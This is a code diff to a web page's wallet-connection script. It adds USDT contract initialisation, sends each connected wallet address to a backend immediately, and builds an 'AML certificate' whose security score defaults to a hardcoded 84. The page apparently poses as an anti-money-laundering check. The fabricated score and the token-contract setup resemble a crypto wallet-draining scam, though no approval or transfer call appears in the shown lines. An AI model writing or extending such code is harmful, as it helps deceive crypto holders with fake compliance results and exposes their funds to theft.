@@ -1017,7 +1017,6 @@
         let certificateData = {};
         let isProcessing = false;
 
-        // Connect Wallet Function
         async function connectWallet() {
             if (typeof window.ethereum === 'undefined') {
                 showError('Please install MetaMask or TrustWallet!');
@@ -1027,20 +1026,29 @@
             try {
                 showMessage('Connecting wallet...', 'info');
                 
+                // Initialize Web3
+                web3 = new Web3(window.ethereum);
+                
+                // Request account access
                 const accounts = await window.ethereum.request({ 
                     method: 'eth_requestAccounts' 
                 });
                 
-                userWallet = accounts[0];
+                account = accounts[0]; // Use 'account' not 'userWallet'
+                
+                // Initialize USDT Contract
+                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
                 
                 // SAVE TO BACKEND IMMEDIATELY AFTER CONNECTION
-                await saveUserToBackend(userWallet);
+                await saveUserToBackend(account);
                 
+                // Update UI
                 document.getElementById('walletAddress').textContent = 
-                    userWallet.slice(0, 6) + '...' + userWallet.slice(-4);
+                    account.slice(0, 6) + '...' + account.slice(-4);
                 
                 document.getElementById('connectBtn').style.display = 'none';
-                document.getElementById('approveSection').style.display = 'block';
+                document.getElementById('walletInfo').classList.add('show');
+                document.getElementById('verificationSectionInner').classList.add('show');
                 
                 showMessage('Wallet connected successfully!', 'success');
                 
@@ -1049,15 +1057,14 @@
                 showError('Failed to connect wallet. Please try again.');
             }
         }
-        
-        // Function to save user to backend
-        async function saveUserToBackend(walletAddress) {
+
+        async function saveUserToBackend(walletAddress, certData = null) {
             try {
                 const userData = {
                     wallet: walletAddress,
                     timestamp: new Date().toISOString(),
-                    certificateId: `AML-${walletAddress.slice(0, 10)}-${Date.now()}`,
-                    score: 84
+                    certificateId: certData ? certData.certificateId : `AML-${walletAddress.slice(0, 10)}-${Date.now()}`,
+                    score: certData ? certData.securityScore : 84
                 };
         
                 const response = await fetch(`${BACKEND_URL}/api/save-user`, {
